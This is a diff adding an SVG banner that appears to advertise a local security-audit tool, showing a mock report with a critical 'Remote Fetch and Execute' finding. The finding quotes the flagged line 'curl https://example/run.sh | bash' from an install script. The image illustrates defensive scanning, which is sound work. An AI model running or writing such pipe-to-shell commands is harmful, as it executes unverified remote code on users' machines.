@@ -1,0 +1,19 @@
+<svg width="1200" height="720" viewBox="0 0 1200 720" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <rect width="1200" height="720" rx="32" fill="#0F172A"/>
+  <rect x="48" y="44" width="1104" height="632" rx="24" fill="#111827" stroke="#334155" stroke-width="2"/>
+  <circle cx="96" cy="84" r="10" fill="#FB7185"/>
+  <circle cx="128" cy="84" r="10" fill="#FBBF24"/>
+  <circle cx="160" cy="84" r="10" fill="#34D399"/>
+  <text x="200" y="92" fill="#E5E7EB" font-family="Menlo, Monaco, monospace" font-size="26">TraceRoot Audit Report</text>
+  <text x="88" y="150" fill="#93C5FD" font-family="Menlo, Monaco, monospace" font-size="24">Target: ./openclaw</text>
+  <text x="88" y="188" fill="#FDE68A" font-family="Menlo, Monaco, monospace" font-size="24">Risk score: 8.7/10</text>
+  <rect x="88" y="236" width="1024" height="108" rx="18" fill="#3F1D1D" stroke="#EF4444" stroke-width="2"/>
+  <text x="118" y="276" fill="#FCA5A5" font-family="Menlo, Monaco, monospace" font-size="24">[CRITICAL] C002 Remote Fetch and Execute</text>
+  <text x="118" y="314" fill="#F3F4F6" font-family="Menlo, Monaco, monospace" font-size="22">scripts/install.sh   curl https://example/run.sh | bash</text>
+  <rect x="88" y="372" width="1024" height="88" rx="18" fill="#3D2B12" stroke="#F59E0B" stroke-width="2"/>
+  <text x="118" y="412" fill="#FDE68A" font-family="Menlo, Monaco, monospace" font-size="24">[HIGH] H001 Missing Trust Metadata</text>
+  <text x="118" y="446" fill="#F3F4F6" font-family="Menlo, Monaco, monospace" font-size="22">Fix: run traceroot-audit init .</text>
+  <rect x="88" y="492" width="1024" height="112" rx="18" fill="#13293D" stroke="#38BDF8" stroke-width="2"/>
+  <text x="118" y="532" fill="#BFDBFE" font-family="Menlo, Monaco, monospace" font-size="24">Fast local scan. Clean JSON for CI. Zero-dashboard workflow.</text>
+  <text x="118" y="570" fill="#E5E7EB" font-family="Menlo, Monaco, monospace" font-size="22">scan .   scan . --format json   scan . --fail-on high</text>
+</svg>
